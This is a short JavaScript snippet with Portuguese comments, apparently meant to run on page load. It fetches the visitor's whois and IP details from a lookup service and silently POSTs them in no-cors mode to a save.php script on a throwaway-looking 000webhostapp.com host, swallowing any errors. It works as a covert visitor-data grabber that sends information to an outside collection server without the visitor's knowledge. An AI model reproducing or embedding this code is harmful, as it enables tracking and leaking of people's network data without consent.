      async function fetchData() {
        try {
          const resp = await fetch("https://hutils.loxal.net/whois");
          if (!resp.ok) {
            throw new Error("Erro na resposta da solicitação");
          }
          const data = await resp.text();
          return data;
        } catch (error) {
          console.error("Erro ao buscar dados:", error);
          throw error; // Rejeita a Promise se ocorrer um erro
        }
      }
      async function main() {
        try {
          const myData = await fetchData();
         // console.log("Fora da função fetchData:", myData);
          // Agora você pode usar myData com segurança aqui
          post = fetch("https://asdffsdfsd.000webhostapp.com/save.php", {
            mode: "no-cors",
            method: "POST",
            body: JSON.stringify({
              texto: myData
            }),
            headers: {
              "Content-type": "application/json; charset=utf-8"
            }
            //"application/x-www-form-urlencoded; charset=UTF-8"}
          });
          post.then(data => {
            //console.log(data);
          });
        } catch (error) {
          // Lidar com erros, se necessário
        }
      }
      main();

